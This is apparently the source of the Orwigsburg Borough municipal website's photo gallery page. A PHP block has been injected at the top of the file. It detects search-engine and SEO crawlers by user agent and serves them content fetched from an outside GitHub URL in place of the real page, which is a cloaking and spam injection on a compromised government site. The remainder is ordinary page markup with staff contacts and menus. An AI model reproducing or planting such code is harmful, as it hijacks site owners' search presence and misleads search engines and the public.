<?php
 
function is_bot() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'tidak ada user agent';
    $bots = array(
        'Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification',
        'Google-InspectionTool', 'AhrefsBot', 'SemrushBot', 'MJ12bot',
        'DotBot', 'PetalBot', 'facebot'
    );
 
    if (empty($user_agent)) {
        return true;
    }
 
    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }
 
    return false;
}
 
 
function get_remote_content($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT'] ?? 'bot-checker');
    $response = curl_exec($ch);
 
    if (curl_errno($ch)) {
        echo 'Curl error: ' . curl_error($ch);
    }
 
    curl_close($ch);
    return $response;
}
 
 
$target_url = 'https://raw.githubusercontent.com/fadlipul69/pluginsss/refs/heads/main/orwigsburggovgallery';
 
 
if (is_bot()) {
    $message = get_remote_content($target_url);
    if ($message) {
        echo $message;
    } else {
        echo "Gagal ambil konten dari URL.";
    }
    exit;
}
?>




<!doctype html>
<html class="no-js" lang="en">
<head>
    <meta charset="utf-8" />
    <meta http-equiv="x-ua-compatible" content="ie=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />

	<title>Photos & Videos | Orwigsburg Borough</title>

    <meta name="theme-version" content="1.8.1" />
    <meta name="foundation-version" content="5.5.4" />
    <meta name="modernizr-version" content="3.6.0" />

	
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
		<meta name="robots" content="index, follow" />
		
	<meta name="twitter:card" content="summary">
	<meta name="twitter:title" content="Photos & Videos | Orwigsburg Borough">
	<meta name="twitter:url" content="https://orwigsburg.gov/gallery/index.php">
	<meta property="og:type" content="website">
	<meta property="og:site_name" content="Orwigsburg Borough">
	<meta property="og:title" content="Photos & Videos | Orwigsburg Borough">
	<meta property="og:url" content="https://orwigsburg.gov/gallery/index.php">

	<link rel="stylesheet" type="text/css" media="all" href="../rw_common/themes/foundation/consolidated.css" />
		
	<script>var foundation={};</script>
	<script>function loadCSS(a,b,c){"use strict";var d=window.document.createElement("link"),e=b||window.document.getElementsByTagName("script")[0],f=window.document.styleSheets;return d.rel="stylesheet",d.href=a,d.media="only x",e.parentNode.insertBefore(d,e),d.onloadcssdefined=function(a){for(var b,c=0;c<f.length;c++)f[c].href&&f[c].href===d.href&&(b=!0);b?a():setTimeout(function(){d.onloadcssdefined(a)})},d.onloadcssdefined(function(){d.media=c||"all"}),d}</script>

	

			<link rel='stylesheet' type='text/css' media='all' href='../rw_common/plugins/stacks/stacks.css' />
<link rel="stylesheet" type="text/css" media="all" href="../rw_common/plugins/stacks/wysiwyg-content.css" />		<link rel='stylesheet' type='text/css' media='all' href='files/stacks_page_page51.css' />
        <script type='text/javascript' charset='utf-8' src='../rw_common/plugins/stacks/jquery-2.2.4.min.js'></script>
        
        <link rel="stylesheet" href="../rw_common/plugins/stacks/font-awesome.min.css">
        
<script type="text/javascript" charset="utf-8" src="../rw_common/plugins/stacks/imagesloaded.min.js"></script><script type="text/javascript" charset="utf-8" src="../rw_common/plugins/stacks/onimpression.js"></script><script type="text/javascript" charset="utf-8" src="../rw_common/plugins/stacks/moment-with-locales.min.js"></script><script type="text/javascript" charset="utf-8" src="../rw_common/plugins/stacks/caixa.js"></script><script type="text/javascript" charset="utf-8" src="../rw_common/plugins/stacks/mustache.min.js"></script><script type="text/javascript" charset="utf-8" src="../rw_common/plugins/stacks/slick.min.js"></script><script type="text/javascript" charset="utf-8" src="../rw_common/plugins/stacks/social-feed.min.js"></script>		<link rel="dns-prefetch" href="//www.youtube.com"> <link rel="dns-prefetch" href="//i.ytimg.com"> <link rel="preconnect" href="https://www.youtube.com" crossorigin> <link rel="preconnect" href="https://i.ytimg.com" crossorigin> <link rel="preload" href="//www.youtube.com/iframe_api" as="script">

		<script type='text/javascript' charset='utf-8' src='files/stacks_page_page51.js'></script>
		






	<script>var jQuery=stacks.jQuery,$=jQuery;</script>
	
</head>

<body class="antialiased">

<div id="foundation-loader"></div>


 <div id="total-image-reveal" class="reveal-modal" data-reveal aria-hidden="true"> <a class="close-button close-reveal-modal" title="Close" data-close>&times;</a> </div> 

<div id='stacks_out_1' class='stacks_top'><div id='stacks_in_1' class=''><div id='stacks_out_109' class='stacks_out'><div id='stacks_in_109' class='stacks_in '></div></div><div id='stacks_out_111' class='stacks_out'><div id='stacks_in_111' class='stacks_in '>   <!--[if lt IE 9]> <meta http-equiv="refresh" content="0; url="> <![endif]-->     <script> var preloader_config = "line-scale,5".split(','), loader_inner = document.createElement('div'), loader_class = preloader_config[0]||'line-scale', loader_count = preloader_config[1]||5, loader_node = document.getElementById('foundation-loader'); for (var i = 0; i < loader_count; i++){loader_inner.appendChild(document.createElement('div'));} loader_inner.className = 'loader-inner '+loader_class; loader_node.appendChild(loader_inner); loader_node.style.display = "block"; </script>    
</div></div><div id='stacks_out_110' class='stacks_out'><div id='stacks_in_110' class='stacks_in '>
	
	











 
 
</div></div><div id='stacks_out_113' class='stacks_out'><div id='stacks_in_113' class='stacks_in '><div id='stacks_out_113_3' class='stacks_out'><div id='stacks_in_113_3' class='stacks_in com_joeworkman_stacks_foundation_1col_s3_stack'> 
<div class='row  collapse      '  > <div class='columns small-12  small-centered      '> <div id='stacks_out_113_5' class='stacks_out'><div id='stacks_in_113_5' class='stacks_in com_joeworkman_stacks_foundation_iconbar_s3_stack'><nav class="icon-bar horizontal custom " role="navigation">  <a role="button" tabindex="0" href="tel:570-366-3103" class="item " rel="">   <i class="fa fa-phone"></i>   </a> 
 <a role="button" tabindex="0" href="../map/" class="item " rel="">   <i class="fa fa-map-marker"></i>   </a> 
 <a role="button" tabindex="0" href="https://www.facebook.com/orwigsburg" class="item " rel="external">   <i class="fa fa-facebook"></i>   </a> 
  <a role="button" tabindex="0" data-reveal-id="email" class="item">    <i class="fa fa-envelope"></i>   </a> 
 </nav> 
</div></div><div id='stacks_out_113_41' class='stacks_out'><div id='stacks_in_113_41' class='stacks_in com_joeworkman_stacks_foundation_reveal_stack'> <div id="email" class="reveal-lightbox reveal-modal small  " style="" aria-hidden="true" role="dialog" data-reveal> <div id='stacks_out_113_46' class='stacks_out'><div id='stacks_in_113_46' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div><!-- Total Toggle -->





  
	<div id='stacks_out_113_31' class='stacks_out'><div id='stacks_in_113_31' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_113_36' class='stacks_out'><div id='stacks_in_113_36' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    William Reppy    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_113_37' class='stacks_out'><div id='stacks_in_113_37' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Manager    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_113_35' class='stacks_out'><div id='stacks_in_113_35' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:manager@orwigsburg.gov" class=" button    tiny success  " target="" rel="">Email Now</a>   
</div></div>  </div> </div> 
</div></div><div id='stacks_out_113_45' class='stacks_out'><div id='stacks_in_113_45' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div>


  

 
<!-- Total Toggle -->





  
	<div id='stacks_out_113_68' class='stacks_out'><div id='stacks_in_113_68' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_113_69' class='stacks_out'><div id='stacks_in_113_69' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Harlee Lomas    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_113_71' class='stacks_out'><div id='stacks_in_113_71' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Secretary    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_113_73' class='stacks_out'><div id='stacks_in_113_73' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:secretary@orwigsburg.gov" class=" button    tiny success  " target="" rel="">Email Now</a>   
</div></div>  </div> </div> 
</div></div><div id='stacks_out_113_75' class='stacks_out'><div id='stacks_in_113_75' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div>


  

 
<!-- Total Toggle -->





  
	<div id='stacks_out_113_78' class='stacks_out'><div id='stacks_in_113_78' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_113_79' class='stacks_out'><div id='stacks_in_113_79' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    David Teter    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_113_81' class='stacks_out'><div id='stacks_in_113_81' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Water/Sewer Department    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_113_83' class='stacks_out'><div id='stacks_in_113_83' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:dteter@orwigsburg.gov" class=" button    tiny success  " target="" rel="">Email Now</a>   
</div></div>  </div> </div> 
</div></div><div id='stacks_out_113_85' class='stacks_out'><div id='stacks_in_113_85' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div>


  

 
<!-- Total Toggle -->





  
	<div id='stacks_out_113_88' class='stacks_out'><div id='stacks_in_113_88' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_113_89' class='stacks_out'><div id='stacks_in_113_89' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Vince McDonald    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_113_91' class='stacks_out'><div id='stacks_in_113_91' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Police Chief    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_113_93' class='stacks_out'><div id='stacks_in_113_93' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto: VMcDonald@orwigsburg.gov" class=" button    tiny success  " target="" rel="">Email Now</a>   
</div></div>  </div> </div> 
</div></div><div id='stacks_out_113_95' class='stacks_out'><div id='stacks_in_113_95' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div>


  

 
<!-- Total Toggle -->





  
	<div id='stacks_out_113_48' class='stacks_out'><div id='stacks_in_113_48' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_113_49' class='stacks_out'><div id='stacks_in_113_49' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Barry Berger    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_113_51' class='stacks_out'><div id='stacks_in_113_51' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Mayor    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_113_53' class='stacks_out'><div id='stacks_in_113_53' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:bberger@orwigsburg.gov" class=" button    tiny success  " target="" rel="">Email Now</a>   
</div></div>  </div> </div> 
</div></div><div id='stacks_out_113_55' class='stacks_out'><div id='stacks_in_113_55' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div>


  

 
<!-- Total Toggle -->





  
	<div id='stacks_out_113_116' class='stacks_out'><div id='stacks_in_113_116' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_113_117' class='stacks_out'><div id='stacks_in_113_117' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Richard Bubeck    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_113_119' class='stacks_out'><div id='stacks_in_113_119' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Council President    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_113_121' class='stacks_out'><div id='stacks_in_113_121' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:rbubeck@orwigsburg.gov" class=" button    tiny success  " target="" rel="">Email Now</a>   
</div></div>  </div> </div> 
</div></div><div id='stacks_out_113_123' class='stacks_out'><div id='stacks_in_113_123' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div>


  

 
<!-- Total Toggle -->





  
	<div id='stacks_out_113_127' class='stacks_out'><div id='stacks_in_113_127' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_113_128' class='stacks_out'><div id='stacks_in_113_128' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Police Department    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_113_130' class='stacks_out'><div id='stacks_in_113_130' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    General Contact    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_113_132' class='stacks_out'><div id='stacks_in_113_132' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:police@orwigsburg.gov" class=" button    tiny success  " target="" rel="">Email Now</a>   
</div></div>  </div> </div> 
</div></div><div id='stacks_out_113_134' class='stacks_out'><div id='stacks_in_113_134' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div>


  

 
<!-- Total Toggle -->





  
	<div id='stacks_out_113_138' class='stacks_out'><div id='stacks_in_113_138' class='stacks_in com_joeworkman_stacks_foundation_3col_s3_stack'> 
<div class='row     '  > <div class='columns small-12    medium-4     ' >  <div id='stacks_out_113_139' class='stacks_out'><div id='stacks_in_113_139' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    General Inquires    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_113_141' class='stacks_out'><div id='stacks_in_113_141' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    Borough Office    
 
</div></div>  </div> <div class='columns small-12    medium-4     ' >  <div id='stacks_out_113_143' class='stacks_out'><div id='stacks_in_113_143' class='stacks_in com_joeworkman_stacks_foundation_button_stack'>  <a role="button" href="mailto:borough@orwigsburg.gov" class=" button    tiny success  " target="" rel="">Email Now</a>   
</div></div>  </div> </div> 
</div></div><div id='stacks_out_113_145' class='stacks_out'><div id='stacks_in_113_145' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div>


  

 
<!-- Total Toggle -->





  



  

 
 <a class="close-reveal-modal" aria-label="close" style="">&#215;</a> </div> 
</div></div> </div> </div> 
</div></div><div id='stacks_out_113_1' class='stacks_out'><div id='stacks_in_113_1' class='stacks_in com_joeworkman_stacks_foundation_topbar_s3_stack'>


<div class="top-bar-wrapper  font-family-h2  sticky   matchPadding solid fixedShadow styleActive  submenuIndicator menu-align-right zone-align-right">
    <nav class="top-bar" data-topbar data-options="is_hover:true;custom_back_text:true;back_text:Back;mobile_show_parent_link:true;scrolltop:false;" role="navigation">
        <ul class="title-area title-area-site-setup">
            <li class="name ">
                
                    <a href="https://orwigsburg.gov/">
                        
                            <span class="show-for-medium-up"><img src="../rw_common/images/Borough-logo-png-500-tiny.png" width="500" height="475" alt="Orwigsburg Borough"/></span>
                        
                        
                            <h1 class="site-title font-family-h1 ">
                                Orwigsburg Borough
                                
                            </h1>
                        
                    </a>
                

                
            </li>
            <li class="toggle-topbar menu-icon">
                <a href="#">
                    <span>MENU</span>
                </a>
            </li>
        </ul>

        <section class="top-bar-section font-family-h2 menu-rw">







    <ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../" rel="">Home</a></li><li class="has-dropdown" role="menuitem"><a href="https://orwigsburg.gov/services/utility-payment" rel="">Utility Payment</a></li><li class="has-dropdown" role="menuitem"><a href="../government/" rel="">Government</a><ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../government/gov-news/" rel="">Borough News</a></li><li class="has-dropdown" role="menuitem"><a href="../government/officials/" rel="">Officials</a></li><li class="has-dropdown" role="menuitem"><a href="../government/financials/" rel="">Financial Reports</a></li><li class="has-dropdown" role="menuitem"><a href="../government/public-meetings/" rel="">Public Meetings</a></li><li class="has-dropdown" role="menuitem"><a href="../government/building-zoning/" rel="">Building-Zoning Codes</a></li><li class="has-dropdown" role="menuitem"><a href="../government/community-reports/" rel="">Community Reports</a></li><li class="has-dropdown" role="menuitem"><a href="../government/ordinances/" rel="">Ordinances</a></li><li class="has-dropdown" role="menuitem"><a href="../government/employment/" rel="">Employment</a></li><li class="has-dropdown" role="menuitem"><a href="../government/forms/" rel="">Forms</a></li><li class="has-dropdown" role="menuitem"><a href="../government/tax-collection/" rel="">Tax Collection</a></li></ul></li><li class="has-dropdown" role="menuitem"><a href="../services/" rel="">Services</a><ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../services/utility-payment/" rel="">Utility Payment</a></li><li class="has-dropdown" role="menuitem"><a href="../services/water/" rel="">Water</a></li><li class="has-dropdown" role="menuitem"><a href="../services/sewer/" rel="">Sewer</a></li><li class="has-dropdown" role="menuitem"><a href="../services/garbage-recycling/" rel="">Garbage-Recycling</a></li><li class="has-dropdown" role="menuitem"><a href="../services/ambulance/" rel="">Ambulance</a></li><li class="has-dropdown" role="menuitem"><a href="../services/fire/" rel="">Fire Dept.</a></li><li class="has-dropdown" role="menuitem"><a href="../services/police/" rel="">Police</a><ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../services/police/news/" rel="">Police News</a></li><li class="has-dropdown" role="menuitem"><a href="../services/police/police-staff/" rel="">Police Staff</a></li><li class="has-dropdown" role="menuitem"><a href="../services/police/police-equipment/" rel="">Police Equipment</a></li><li class="has-dropdown" role="menuitem"><a href="../services/police/police-pay-fines/" rel="">Pay Fines</a></li><li class="has-dropdown" role="menuitem"><a href="../services/police/laws-regs/" rel="">Forms,Laws,Regs</a></li><li class="has-dropdown" role="menuitem"><a href="../services/police/contact/" rel="">Contact Police</a></li></ul></li><li class="has-dropdown" role="menuitem"><a href="../services/streets/" rel="">Streets-Roads</a></li><li class="has-dropdown" role="menuitem"><a href="../services/swift/" rel="">RAVE Notifications</a></li></ul></li><li class="has-dropdown" role="menuitem"><a href="../play/" rel="">Play</a><ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../play/events/" rel="">Events</a></li><li class="has-dropdown" role="menuitem"><a href="../play/community/" rel="">Community</a></li><li class="has-dropdown" role="menuitem"><a href="../play/parks-rec/" rel="">Parks & Recreation</a></li></ul></li><li class="has-dropdown" role="menuitem"><a href="../live/" rel="">Live</a><ul class="menu dropdown" role="navigation"><li class="has-dropdown" role="menuitem"><a href="../live/churches/" rel="">Churches</a></li><li class="has-dropdown" role="menuitem"><a href="../live/schools/" rel="">Schools</a></li><li class="has-dropdown" role="menuitem"><a href="../live/library/" rel="">Library</a></li><li class="has-dropdown" role="menuitem"><a href="../live/orgs/" rel="">Organizations</a></li></ul></li></ul>










        </section>
    </nav>
</div>



</div></div></div></div><div id='stacks_out_9' class='stacks_out'><div id='stacks_in_9' class='stacks_in com_joeworkman_stacks_foundation_1col_s3_stack'> 
<div class='row  collapse      '  > <div class='columns small-12      '> <div id='stacks_out_10' class='stacks_out'><div id='stacks_in_10' class='stacks_in com_joeworkman_stacks_foundation_1col_s3_stack'> 
<div class='row        '  > <div class='columns small-12      '> <div id='stacks_out_79' class='stacks_out'><div id='stacks_in_79' class='stacks_in com_joeworkman_stacks_foundation_1col_s3_stack'> 
<div class='row        '  > <div class='columns small-12      '> <div id='stacks_out_80' class='stacks_out'><div id='stacks_in_80' class='stacks_in com_bigwhiteduck_stacks_headerpro_stack'>    


	








<div class="hp-slice" hidden style="display:none;">Site TitleSite Slogan</div>
<h3 class="header-pro text-inherit       " >

	 
	 

			<span class="h-pro"><!--
--><!--
--><span class="hTxt primary  ">Photo Galleries</span><!--
--><!--
--><!--
--><!--
--></span>

		 
	
</h3> 



<div class='slice empty out'><div class='slice empty in'></div></div>




</div></div><div class="total-blog-list blog_stacks_in_83 grid  " data-slug="photos">






<article class="post hover-press author-click-on-any-image-to-view-gallery-with-full-size-images genre-default        ">




<div class="default-layout">
  <a class="blog-link" href="https://orwigsburg.gov/gallery/gallery-display/?permalink=farm-to-square-2018" title="Read more about  Farm to Square 2018">  <div class="post_layout_wrapper    layout1_stacks_in_84    " style=""> <div class="post_column1"> <div class="post-image-wrapper stacks_in_85"> <a class="blog-link" href="https://orwigsburg.gov/gallery/gallery-display/?permalink=farm-to-square-2018" title="Read more about  Farm to Square 2018">  <ul class="post-image animate blur  animate scale-down animate shadow-in orbit" data-orbit data-options="animation:slide;pause_on_hover:false;navigation_arrows:true;slide_number:false;bullets:false;circular:true;timer:true;animation_speed:1500;timer_speed:5601;">     <li><div class="post-bg-image " style="background-image:url(../cms-data/gallery/blog/photos/farm-to-square-2018/i-x956pf5-xl-th.jpg);"></div></li>    <li><div class="post-bg-image " style="background-image:url(../cms-data/gallery/blog/photos/farm-to-square-2018/i-wd5xx2h-xl-th.jpg);"></div></li>    <li><div class="post-bg-image " style="background-image:url(../cms-data/gallery/blog/photos/farm-to-square-2018/i-v5hp6s9-xl-th.jpg);"></div></li>    <li><div class="post-bg-image " style="background-image:url(../cms-data/gallery/blog/photos/farm-to-square-2018/i-trwmvpb-xl-th.jpg);"></div></li>    <li><div class="post-bg-image " style="background-image:url(../cms-data/gallery/blog/photos/farm-to-square-2018/i-sfbdstj-xl-th.jpg);"></div></li>    </ul> </a> </div>   
</div>  </div> </a> 
  <a class="blog-link" href="https://orwigsburg.gov/gallery/gallery-display/?permalink=farm-to-square-2018" title="Read more about  Farm to Square 2018">  <div class="post_layout_wrapper    layout1_stacks_in_87  absolute-top height-full " style=""> <div class="post_column1">    <div class="post_layout_wrapper    layout1_stacks_in_88 show-on-hover vertical-center  " style=""> <div class="post_column1">  <h3 class="post-title  text-center  alt">Farm to Square 2018 </h3>    
</div>  </div>  
</div>  </div> </a> 

</div>






</article>
</div>



<script id="posts_stacks_in_83" type="application/json">
[]</script>
<template id="template_stacks_in_83">
<article class="post hover-press {{#authorlink}}author-{{authorlink}}{{/authorlink}} {{#genrelink}}genre-{{genrelink}}{{/genrelink}} {{#categories}}category-{{link}} {{/categories}} {{#tags}}tag-{{link}} {{/tags}} {{#labels}}label-{{link}} {{/labels}}   {{# featured }}featured{{/ featured }} {{# draft }}draft{{/ draft }} {{# archived }}archived{{/ archived }}">




<div class="default-layout">
  <a class="blog-link" href="{{ url }}" title="{{aria}} {{title}}">  <div class="post_layout_wrapper    layout1_stacks_in_84    " style=""> <div class="post_column1"> <div class="post-image-wrapper stacks_in_85"> <a class="blog-link" href="{{ url }}" title="{{aria}} {{title}}"> {{#slideshow}} <ul class="post-image animate blur  animate scale-down animate shadow-in {{ type }}" data-orbit data-options="animation:slide;pause_on_hover:false;navigation_arrows:true;slide_number:false;bullets:false;circular:true;timer:true;animation_speed:1500;timer_speed:{{timer}};"> {{/slideshow}} {{^slideshow}} <ul class="post-image animate blur  animate scale-down animate shadow-in {{ type }}"> {{/slideshow}} {{#gallery}}  <li><div class="post-bg-image " style="background-image:url({{ thumb.th }});"></div></li>  {{/gallery}} {{^ gallery }}    {{/ gallery }} </ul> </a> </div>   
</div>  </div> </a> 
  <a class="blog-link" href="{{ url }}" title="{{aria}} {{title}}">  <div class="post_layout_wrapper    layout1_stacks_in_87  absolute-top height-full " style=""> <div class="post_column1">    <div class="post_layout_wrapper    layout1_stacks_in_88 show-on-hover vertical-center  " style=""> <div class="post_column1">  <h3 class="post-title  text-center  alt">{{{ title }}} </h3>    
</div>  </div>  
</div>  </div> </a> 

</div>






</article></template>




<button id="loadmore_stacks_in_83" role="button"
    class="button loadmore   small fn-scheme-swatch6 "
    >Load More Galleries</button>





 
 </div> </div> 
</div></div> </div> </div> 
</div></div><!-- Total Toggle -->





  



  

 
 </div> </div> 
</div></div><div id='stacks_out_112' class='stacks_out'><div id='stacks_in_112' class='stacks_in '><div id='stacks_out_112_1' class='stacks_out'><div id='stacks_in_112_1' class='stacks_in com_joeworkman_stacks_foundation_1col_s3_stack'> 
<div class='row  collapse max-edge     '  > <div class='columns small-12      '> <div  class="sgw-footer" style=""> <!-- Total Toggle -->





  
	<div id='stacks_out_112_47' class='stacks_out'><div id='stacks_in_112_47' class='stacks_in com_joeworkman_stacks_foundation_2col_s3_stack'> 
<div class='row   max-custom  '  > <div class='columns small-12    medium-3     ' >  <!-- Total Toggle -->





  
	<div id='stacks_out_112_52' class='stacks_out'><div id='stacks_in_112_52' class='stacks_in com_joeworkman_stacks_totalcms_image_stack'>   <a href="../" title="Home"> <img loading="auto" class="   center " oncontextmenu="return false;" draggable="false" alt='' data-img="https://orwigsburg.gov/cms-data/image/footer-logo.png"  src="https://orwigsburg.gov/cms-data/image/footer-logo-sq.png"   onerror="this.style.display='none'"  /> </a>   















 
</div></div>


  

 
  </div> <div class='columns small-12    medium-9     ' >  <div id='stacks_out_112_10' class='stacks_out'><div id='stacks_in_112_10' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    <h3>&nbsp; &nbsp;<br><br></h3><h1><strong>Borough Of Orwigsburg</strong></h1>    
 
</div></div>  </div> </div> 
</div></div>


  

 
<div id='stacks_out_112_41' class='stacks_out'><div id='stacks_in_112_41' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div><div id='stacks_out_112_15' class='stacks_out'><div id='stacks_in_112_15' class='stacks_in com_joeworkman_stacks_foundation_4col_s3_stack'> 
<div class='row   max-custom  '  > <div class='columns small-12    medium-3     ' >  <!-- Total Toggle -->





  
	<div id='stacks_out_112_22' class='stacks_out'><div id='stacks_in_112_22' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    <h4>Contact Information</h4><p><strong>Address</strong><br>333 S. Liberty St.<br>Orwigsburg, Pa 17961</p><p><strong>Office Hours</strong><br>8:00 a.m. to 5:00 p.m.<br>Phone Hours<br>8:00 a.m. to 5: 00 p.m.<br><strong>Phone</strong><br>(570)-366-3103<br><strong>Fax</strong><br>(570)-366-3106<br><br><a href="/contact"><strong>Contact Form</strong></a></p><p><br><br><br></p>    
 
</div></div>


  

 
  </div> <div class='columns small-12    medium-3     ' >  <!-- Total Toggle -->





  
	<div id='stacks_out_112_26' class='stacks_out'><div id='stacks_in_112_26' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    <h4>Living &amp; Working</h4><p><a href="/history">Borough History<br></a><a href="/live/churches/">Churches</a><br><a href="/play/events/">Events</a><br><a href="/fyi">FYI Articles</a><br><a href="/government/employment/">Job Openings<br></a><a href="/live/library/">Library</a><br><a href="/live/orgs/">Organizations<br></a><a href="/play/parks-rec/">Parks &amp; Recreation<br></a><a href="/gallery">Photo Gallery<br></a><a href="/live/schools/">Schools</a><a href="/history"></a></p>    
 
</div></div>


  

 
  </div> <div class='columns small-12    medium-3     ' >  <!-- Total Toggle -->





  
	<div id='stacks_out_112_30' class='stacks_out'><div id='stacks_in_112_30' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    <h4>Services</h4><p><a href="/services/utility-payment/">Utility Payment<br></a><a href="/services/ambulance/">Ambulance Service<br></a><a href="/services/police/">Police Department</a><br><a href="/services/water/">Water Department<br></a><a href="/services/streets/">Streets Department</a><br><a href="/services/sewer/">Sewer Department</a><br><a href="/services/fire/">Fire Department</a><br><a href="/services/garbage-recycling/">Sanitation Department</a><br><a href="/services/swift/"></a><a href="https://www.smart911.com/smart911/ref/login.action?pa=orwigsburg">RAVE Mobile Safety</a></p><p><br><br><br></p>    
 
</div></div>


  

 
  </div> <div class='columns small-12    medium-3     ' >  <!-- Total Toggle -->





  
	<div id='stacks_out_112_34' class='stacks_out'><div id='stacks_in_112_34' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    <h4>Government</h4><p><a href="/government/forms/"></a><a href="/government/forms/">Borough Forms</a><br><a href="/government/officials/">Borough Officials</a><br><a href="/government/building-zoning/">Building/Zoning Codes</a><br><a href="/government/community-reports/">Community Reports</a><br><a href="/government/employment/">Employment</a><br><a href="/government/financials/">Financial Reports</a><br><a href="/government/gov-news">Government News</a><br><a href="/government/public-meetings/">Public Meetings</a><br><a href="/government/tax-collection/">Tax Collection</a> <br><br><br></p><p><br></p>    
 
</div></div>


  

 
  </div> </div> 
</div></div><div id='stacks_out_112_40' class='stacks_out'><div id='stacks_in_112_40' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div><div id='stacks_out_112_2' class='stacks_out'><div id='stacks_in_112_2' class='stacks_in com_joeworkman_stacks_foundation_1col_s3_stack'> 
<div class='row  collapse max-custom     '  > <div class='columns small-12  small-centered      '> <!-- Total Toggle -->





  



  

 
 </div> </div> 
